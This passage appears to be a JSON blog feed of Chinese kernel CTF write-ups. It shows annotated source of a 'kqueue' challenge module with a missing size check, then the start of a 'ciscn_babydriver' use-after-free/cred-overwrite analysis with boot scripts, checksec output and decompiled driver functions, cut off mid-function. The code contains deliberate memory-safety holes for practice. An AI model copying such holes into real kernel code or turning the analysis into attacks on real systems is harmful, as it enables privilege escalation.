href=\"#edit_kqueue\">#</a> edit_kqueue</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">edit_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* Check the idx of the kqueue */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if the kqueue exists at that idx */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = kqueues[request.queue_idx];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">queue</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check the idx of the kqueue entry */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.entry_idx &gt; <span class=\"built_in\">queue</span>-&gt;max_entries)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//根据idx进行定位，定位到节点，每个节点不会保留data的大小，</span></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the kqueue entry memory */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry = (queue_entry *)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>);<span class=\"comment\">//第一个头节点</span></span><br><span class=\"line\"><span class=\"comment\">//进行一个简单的遍历</span></span><br><span class=\"line\">    <span class=\"comment\">/* Check for the existence of the kqueue entry */</span></span><br><span class=\"line\">    exists = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;<span class=\"built_in\">queue</span>-&gt;max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">/* If kqueue entry found , do the necessary */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class=\"built_in\">queue</span>-&gt;data_size)&#123;<span class=\"comment\">//节点存在，data指针不为空，</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;</span><br><span class=\"line\">                validate(<span class=\"built_in\">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class=\"built_in\">queue</span>-&gt;data_size));</span><br><span class=\"line\">                exists = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.entry_idx==<span class=\"number\">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class=\"built_in\">queue</span>-&gt;data_size)&#123;</span><br><span class=\"line\">        validate(<span class=\"built_in\">memcpy</span>(<span class=\"built_in\">queue</span>-&gt;data,request.data,<span class=\"built_in\">queue</span>-&gt;data_size));<span class=\"comment\">//memcpy返回的是queue-&gt;data</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!exists)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> NOT_EXISTS;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>这里要注意下头部也是可以保存信息的，但是目前还未看到漏洞。</p>\n<h3 id=\"save_kqueue_entries\"><a class=\"markdownIt-Anchor\" href=\"#save_kqueue_entries\">#</a> save_kqueue_entries</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">save_kqueue_entries</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check for out of bounds queue_idx requests */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if queue is already saved or not */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(isSaved[request.queue_idx]==<span class=\"literal\">true</span>)\t\t\t\t<span class=\"comment\">//isSaved一个bool类型的数组</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Queue already saved&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = validate(kqueues[request.queue_idx]);\t<span class=\"comment\">//检查参数值是否为空的函数validate</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.max_entries &lt; <span class=\"number\">1</span> || request.max_entries &gt; <span class=\"built_in\">queue</span>-&gt;max_entries)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Allocate memory for the kqueue to be saved */</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *new_queue = validate((<span class=\"type\">char</span> *)kzalloc(<span class=\"built_in\">queue</span>-&gt;queue_size,GFP_KERNEL));<span class=\"comment\">//新开一个空间</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Each saved entry can have its own size */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.data_size &gt; <span class=\"built_in\">queue</span>-&gt;queue_size)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class=\"line\">        validate(<span class=\"built_in\">memcpy</span>(new_queue,<span class=\"built_in\">queue</span>-&gt;data,request.data_size));<span class=\"comment\">//没有检查size，</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Internal error&quot;</span>);</span><br><span class=\"line\">    new_queue += <span class=\"built_in\">queue</span>-&gt;data_size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the entries of the kqueue */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry = (queue_entry *)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* copy all possible kqueue entries */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;request.max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class=\"line\">            validate(<span class=\"built_in\">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            err(<span class=\"string\">&quot;[-] Internal error&quot;</span>);</span><br><span class=\"line\">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class=\"line\">        new_queue += <span class=\"built_in\">queue</span>-&gt;data_size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Mark the queue as saved */</span></span><br><span class=\"line\">    isSaved[request.queue_idx] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "learning"
            ]
        },
        {
            "id": "http://example.com/2022/05/02/ciscn-babydriver/",
            "url": "http://example.com/2022/05/02/ciscn-babydriver/",
            "title": "ciscn_babydriver",
            "date_published": "2022-05-02T06:36:45.000Z",
            "content_html": "<h1 id=\"ciscn_babydriveruaf修改自身的cred\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_babydriveruaf修改自身的cred\">#</a> ciscn_babydriver\tuaf,\t修改自身的 cred</h1>\n<h2 id=\"保护检查\"><a class=\"markdownIt-Anchor\" href=\"#保护检查\">#</a> 保护检查：</h2>\n<h3 id=\"qemu\"><a class=\"markdownIt-Anchor\" href=\"#qemu\">#</a> qemu</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/kernel/babydriver$ <span class=\"built_in\">cat</span> boot.sh </span><br><span class=\"line\"><span class=\"comment\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">qemu-system-x86_64 -initrd fs.cpio -kernel bzImage -append <span class=\"string\">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -s</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>没有开启地址随机化以及隔离保护</p>\n<h3 id=\"驱动文件\"><a class=\"markdownIt-Anchor\" href=\"#驱动文件\">#</a> 驱动文件</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">mount -t proc none /proc</span><br><span class=\"line\">mount -t sysfs none /sys</span><br><span class=\"line\">mount -t devtmpfs devtmpfs /dev</span><br><span class=\"line\"><span class=\"built_in\">chown</span> root:root flag</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 400 flag</span><br><span class=\"line\"><span class=\"built_in\">exec</span> 0&lt;/dev/console</span><br><span class=\"line\"><span class=\"built_in\">exec</span> 1&gt;/dev/console</span><br><span class=\"line\"><span class=\"built_in\">exec</span> 2&gt;/dev/console</span><br><span class=\"line\"></span><br><span class=\"line\">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 777 /dev/babydev</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;\\nBoot took <span class=\"subst\">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\\n&quot;</span></span><br><span class=\"line\">setsid cttyhack setuidgid 1000 sh</span><br><span class=\"line\"></span><br><span class=\"line\">umount /proc</span><br><span class=\"line\">umount /sys</span><br><span class=\"line\">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>\n<p>在这里我们看到他的驱动的位置是在 /lib/modules/4.4.72/babydriver.ko</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/kernel/babydriver/lib/modules/4.4.72$ checksec babydriver.ko</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/kernel/babydriver/lib/modules/4.4.72/babydriver.ko&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>\n<h3 id=\"vmlinux\"><a class=\"markdownIt-Anchor\" href=\"#vmlinux\">#</a> vmlinux</h3>\n<p>我们提取出来 vmlinux 后，extract-vmlinux bzImage &gt; vmlinux</p>\n<p>进行检查，发现保护什么也没有开。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/kernel/babydriver$ checksec vmlinux</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/kernel/babydriver/vmlinux&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0xffffffff81000000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"题目分析\"><a class=\"markdownIt-Anchor\" href=\"#题目分析\">#</a> 题目分析</h2>\n<p>这是一道堆题</p>\n<h3 id=\"init\"><a class=\"markdownIt-Anchor\" href=\"#init\">#</a> init</h3>\n<p>我们 open 设备的时候，会默认调用这个函数，这里初始化了一些参数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">babydriver_init</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// edx</span></span><br><span class=\"line\">  __int64 v2; <span class=\"comment\">// rsi</span></span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">class</span> *<span class=\"title\">v5</span>;</span> <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v6; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class=\"number\">0LL</span>, <span class=\"number\">1LL</span>, <span class=\"string\">&quot;babydev&quot;</span>) &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class=\"line\">    v2 = babydev_no;</span><br><span class=\"line\">    cdev_0.owner = &amp;_this_module;</span><br><span class=\"line\">    v4 = cdev_add(&amp;cdev_0, babydev_no, <span class=\"number\">1LL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v5 = (class *)_class_create(&amp;_this_module, <span class=\"string\">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class=\"line\">      babydev_class = v5;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v5 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v7 = device_create(v5, <span class=\"number\">0LL</span>, babydev_no, <span class=\"number\">0LL</span>, <span class=\"string\">&quot;babydev&quot;</span>);</span><br><span class=\"line\">        v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v7 )</span><br><span class=\"line\">          <span class=\"keyword\">return</span> v1;</span><br><span class=\"line\">        printk(&amp;unk_351, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">        class_destroy(babydev_class);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        printk(&amp;unk_33B, <span class=\"string\">&quot;babydev&quot;</span>, v6);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      cdev_del(&amp;cdev_0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      printk(&amp;unk_327, v2, v3);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    unregister_chrdev_region(babydev_no, <span class=\"number\">1LL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> v4;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  printk(&amp;unk_309, <span class=\"number\">0LL</span>, v0);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"exit\"><a class=\"markdownIt-Anchor\" href=\"#exit\">#</a> exit</h3>\n<p>同理，我们关闭设备的后会调用这个函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __cdecl <span class=\"title function_\">babydriver_exit</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  device_destroy(babydev_class, babydev_no);</span><br><span class=\"line\">  class_destroy(babydev_class);</span><br><span class=\"line\">  cdev_del(&amp;cdev_0);</span><br><span class=\"line\">  unregister_chrdev_region(babydev_no, <span class=\"number\">1LL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"babyopen\"><a class=\"markdownIt-Anchor\" href=\"#babyopen\">#</a> babyopen</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">babyopen</span><span class=\"params\">(inode *inode, file *filp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v2; <span class=\"comment\">// rdx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__(inode, filp);</span><br><span class=\"line\">  babydev_struct.device_buf = (<span class=\"type\">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class=\"number\">6</span>], <span class=\"number\">37748928LL</span>, <span class=\"number\">64LL</span>);</span><br><span class=\"line\">  babydev_struct.device_buf_len = <span class=\"number\">64LL</span>;</span><br><span class=\"line\">  printk(<span class=\"string\">&quot;device open\\n&quot;</span>, <span class=\"number\">37748928LL</span>, v2);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>申请了一个 buf 空间，大小为 0x40</p>\n<h3 id=\"babyrelease\"><a class=\"markdownIt-Anchor\" href=\"#babyrelease\">#</a> babyrelease</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">babyrelease</span><span class=\"params\">(inode *inode, file *filp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v2; <span class=\"comment\">// rdx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__(inode, filp);</span><br><span class=\"line\">  kfree(babydev_struct.device_buf);</span><br><span class=\"line\">  printk(<span class=\"string\">&quot;device release\\n&quot;</span>, filp, v2);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"babyread\"><a class=\"markdownIt-Anchor\" href=\"#babyread\">#</a> babyread</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> __fastcall <span class=\"title function_\">babyread</span><span class=\"params\">(file *filp, <span class=\"type\">char</span> *buffer, <span class=\"type\">size_t</span> length, <span class=\"type\">loff_t</span> *offset)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> v4; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> v6; <span class=\"comment\">// rbx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__(filp, buffer);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !babydev_struct.device_buf )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">  result = <span class=\"number\">-2LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v6 = v4;</span><br><span class=\"line\">    copy_to_user(buffer);</span><br><span class=\"line\">    result = v6;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"babywrite\"><a class=\"markdownIt-Anchor\" href=\"#babywrite\">#</a> babywrite</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> __fastcall <span class=\"title function_\">babywrite</span><span class=\"params\">(file *filp, <span class=\"type\">const</span> <span class=\"type\">char</span> *buffer, <span class=\"type\">size_t</span> length, <span class=\"type\">loff_t</span> *offset)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> v4; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> v6; <span class=\"comment\">// rbx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__(filp, buffer);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !babydev_struct.device_buf )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">  result = <span class=\"number\">-2LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span 